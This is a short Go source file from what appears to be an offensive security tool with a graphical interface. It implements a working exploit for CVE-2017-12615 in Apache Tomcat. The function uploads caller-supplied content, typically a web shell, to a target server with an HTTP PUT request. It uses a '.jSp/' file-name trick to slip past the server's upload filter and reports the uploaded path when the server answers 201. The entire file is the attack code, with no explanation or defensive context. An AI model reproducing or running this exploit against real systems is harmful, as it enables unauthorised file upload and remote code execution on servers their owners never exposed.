package vulattack

import (
	"net/http"
	"slack/common/client"
	"slack/common/logger"
	"slack/lib/util"
	"strings"

	"fyne.io/fyne/v2/widget"
)

func CVE_2017_12615(target string, content string, result *widget.Entry) {
	s := util.RandLetters(8)
	target = strings.TrimSuffix(target, "/") + "/" + s + ".jSp/"
	r, err := http.NewRequest("PUT", target, strings.NewReader(content))
	if err != nil {
		logger.Error(err)
		result.SetText("Failed to send request\n")
		return
	}
	netClient := client.DefaultClient()
	r2, err2 := netClient.Do(r)
	if err2 != nil {
		logger.Error(err)
		result.SetText("Failed to send request\n")
		return
	}
	if r2.StatusCode == 201 {
		result.SetText("Upload Successï¼Œupload file path: " + target + "\n")
		return
	}
	result.SetText("The target does't have CVE-2017-12615\n")
}
